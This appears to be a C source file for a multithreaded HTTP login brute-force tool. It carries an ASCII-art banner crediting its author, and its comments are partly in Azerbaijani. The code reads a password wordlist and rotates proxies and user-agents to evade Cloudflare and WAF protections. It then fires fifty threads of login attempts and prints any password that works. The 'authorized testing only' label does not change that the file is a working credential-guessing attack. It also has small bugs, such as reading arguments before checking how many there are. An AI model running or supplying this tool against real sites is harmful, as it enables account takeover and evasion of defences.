/*
 * Authorized Load Testing Framework v3: CF/WAF Bypass HTTP Brute Force Engine
 * FOR LEGITIMATE & AUTHORIZED SECURITY TESTING ONLY
 *
 * Compilation (Linux/Debian): 
 * gcc authorized_bruteforce.c -o bruteforce -lcurl -lpthread
 * 
 * Execution:
 * ./bruteforce https://target.com/login_endpoint /path/to/my_wordlist.txt
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <curl/curl.h>
#include <signal.h>

#define MAX_PASSWORD_LEN 128
#define NUM_THREADS 50          // Thread sayını öz sisteminizin gücünə görə dəyişin
#define PROXY_FILE "proxies.txt"
void matrix_rain();
void pulse_effect();
void loading_animation();
void print_seabuhi_full();


void matrix_rain() {
    int max = 50;
    for (int i = 0; i < 12; i++) {
        int len = rand() % max;
        printf("\033[96m");
        for (int j = 0; j < len; j++)
            printf("█");
        printf("\033[0m\n");
        usleep(60000);
    }
}


void pulse_effect() {
    for (int i = 0; i < 14; i++) {
        int count = (i < 7) ? i : 14 - i;
        printf("\033[96m");
        for (int j = 0; j < count; j++) printf("█");
        printf("\033[0m\r");
        fflush(stdout);
        usleep(60000);
    }
    printf("\n");
}

void loading_animation() {
    printf("\033[96mLoading");
    for (int i = 0; i < 12; i++) {
        fflush(stdout);
        usleep(120000);
        printf(".");
    }
    printf("\033[0m\n");
}


void print_seabuhi_full() {
    system("clear"); 
    matrix_rain();   
    pulse_effect();  

    printf("\033[96m");
    printf("                           ___.             .__      .__ \n");
    printf("  ______   ____   _____    \\_ |__    __ __  |  |__   |__|\n");
    printf(" /  ___/ _/ __ \\  \\__  \\    | __ \\  |  |  \\ |  |  \\  |  |\n");
    printf(" \\___ \\  \\  ___/   / __ \\_  | \\_\\ \\ |  |  / |   Y  \\ |  |\n");
    printf("/____  >  \\___  > (____  /  |___  / |____/  |___|  / |__|\n");
    printf("     \\/       \\/       \\/       \\/               \\/       \n");
    printf("\033[0m\n");

    loading_animation(); 

    printf("\033[96m");
    printf("                 ███████████████████████████████████████████\n");
    printf("                           ✦  T O O L   B Y   S E A B U H I  ✦\n");
    printf("                 GitHub:     https://github.com/seabuhi\n");
    printf("                 Instagram:  @seabuhi\n");
    printf("                 ███████████████████████████████████████████\n");
    printf("\033[0m\n");

    pulse_effect(); 
}

volatile int keep_running = 1;
char username_global[128];
static unsigned long long attempt_count = 0;

// L4/L7 Flood üçün Global dəyişənlər
FILE *wordlist_file = NULL;
char **proxy_list = NULL;
int proxy_count = 0;

// Mutex-lər (Thread-safety üçün)
pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;


// --- cURL Memory Struct for Response Handling ---
struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, struct MemoryStruct *chunk) {
    size_t realsize = size * nmemb;
    char *ptr = realloc(chunk->memory, chunk->size + realsize + 1);
    if(ptr == NULL) { /* Handle error */ return 0; }
    chunk->memory = ptr;
    memcpy(&(chunk->memory[chunk->size]), contents, realsize);
    chunk->size += realsize;
    chunk->memory[chunk->size] = 0;
    return realsize;
}
// ---------------------------------------------


// Signal Handler
void signal_handler(int sig) { 
    keep_running = 0; 
    fprintf(stderr, "\n[!] Termination signal received. Attempting clean shutdown...\n");
}


// Random User-Agent for WAF/CF bypass
const char* random_user_agent() {
    const char *uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36"
    };
    return uas[rand() % (sizeof(uas) / sizeof(uas[0]))];
}


// Proxy List Loader
void load_proxies() {
    FILE *f = fopen(PROXY_FILE, "r");
    if (!f) {
        fprintf(stderr, "[!] Cannot open proxy file: %s. Continuing without proxies.\n", PROXY_FILE);
        return;
    }
    char line[128];
    while (fgets(line, sizeof(line), f)) {
        if (line[0] == '#') continue;
        line[strcspn(line, "\r\n")] = 0;
        if(strlen(line) > 5) {
            proxy_count++;
            proxy_list = realloc(proxy_list, proxy_count * sizeof(char*));
            proxy_list[proxy_count - 1] = strdup(line);
        }
    }
    fclose(f);
    fprintf(stdout, "[*] Loaded %d proxies successfully.\n", proxy_count);
}

// Təhlükəsiz şəkildə fayldan bir sətir oxumaq (Thread-Safe FGETS)
char *thread_safe_fgets(char *s, int size, FILE *stream) {
    char *result = NULL;
    pthread_mutex_lock(&file_mutex);
    result = fgets(s, size, stream);
    pthread_mutex_unlock(&file_mutex);
    if (result) {
        // Remove newline and carriage return
        s[strcspn(s, "\r\n")] = 0;
    }
    return result;
}


// ** ƏSAS BRUTE FORCE WORKER FUNKSİYASI **
void* brute_force_worker(void* arg) {
    char *target_url = (char*)arg;
    CURL *curl;
    int proxy_idx = -1; 
    
    if (proxy_count > 0) {
        proxy_idx = rand() % proxy_count;
    }

    char current_password[MAX_PASSWORD_LEN];
    
    // Limitsiz fayl oxuma döngüsü
    while(thread_safe_fgets(current_password, MAX_PASSWORD_LEN, wordlist_file) != NULL && keep_running) {
        
        if (strlen(current_password) < 1) continue;

        // Attempt counter update (Thread-safe)
        pthread_mutex_lock(&count_mutex);
        attempt_count++;
        pthread_mutex_unlock(&count_mutex);

        // --- Setup cURL for each attempt ---
        curl = curl_easy_init();
        if(!curl) continue;

        struct MemoryStruct chunk = {0};
        chunk.memory = malloc(1); 
        chunk.size = 0;

        char post_fields[256];
        // NOTE: Burada "admin" yerinə dəyişənlər daxil etmək olar.
        snprintf(post_fields, sizeof(post_fields), "username=%s&password=%s&csrf_token=dummy_token", username_global, current_password);

        // ** CLOUDFLARE / WAF BYPASS elementləri **
        curl_easy_setopt(curl, CURLOPT_USERAGENT, random_user_agent()); 
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L); // Slow connection simulation
        curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 0L); // Keep-Alive
        
        // Proxy rotation
        if (proxy_idx != -1) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy_list[proxy_idx]);
            if (rand() % 5 == 0) proxy_idx = rand() % proxy_count;
        }

        // Standard Login Request
        curl_easy_setopt(curl, CURLOPT_URL, target_url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
        
        CURLcode res = curl_easy_perform(curl);

        printf("\r[%llu] Trying: %s:%s               ", attempt_count, username_global, current_password);
        fflush(stdout);
        
        if (res == CURLE_OK) {
             long http_code = 0;
             curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
             
             // Uğurlu giriş yoxlaması - Bu hissə hədəf applicationa görə dəyişməlidir!
             if (http_code == 200 && strstr(chunk.memory, "Welcome to the Dashboard")) { 
                 printf("\n[!!!] SUCCESS! Password found: %s\n", current_password);
                 keep_running = 0; // Terminate all threads
             } else {
                 // Human-like delay
                 usleep(100000 + (rand() % 100000)); 
             }
        } 
        
        free(chunk.memory);
        curl_easy_cleanup(curl);
    }
    
    return NULL;
}


int main(int argc, char *argv[]) {
    
    print_seabuhi_full();
    strncpy(username_global, argv[2], sizeof(username_global)-1);
    username_global[sizeof(username_global)-1] = '\0';

    if (argc != 4) {
        printf("Usage: %s <login_url> <username> <wordlist_file_name>\n", argv[0]);
        printf("Example: %s https://test.com/login seabuhi /path/to/my_wordlist.txt\n");
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    srand(time(NULL) ^ getpid());
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    load_proxies(); // Load Proxy file (proxies.txt)
    
    // Wordlist faylını açın
    wordlist_file = fopen(argv[3], "r");
    if (!wordlist_file) {
        fprintf(stderr, "\n[!!!] FATAL: Failed to open wordlist file: %s\n", argv[2]);
        return 1;
    }

    printf("[*] AUTHORIZED CF/WAF BYPASS BRUTE FORCE ENGINE (FILE BASED)\n");
    printf("[*] Target URL: %s | Wordlist: %s | Threads: %d\n", argv[1], argv[2], NUM_THREADS);
    
    pthread_t* threads = malloc(NUM_THREADS * sizeof(pthread_t));
    if (!threads) { fprintf(stderr, "[!] Memory allocation failed\n"); return 1; }
    
    // Thread-ləri işə salırıq
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, brute_force_worker, argv[1]) != 0) {
            fprintf(stderr, "[!] Failed to create thread %d\n", i);
        }
    }
    
    // Bütün thread-lərin bitməsini gözləyirik
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Cleanup
    fclose(wordlist_file);
    for(int i=0; i<proxy_count; i++) free(proxy_list[i]);
    free(proxy_list);
    free(threads);
    curl_global_cleanup();
    
    printf("\n[*] Test completed. Total attempts: %llu\n", attempt_count);
    return 0;
}
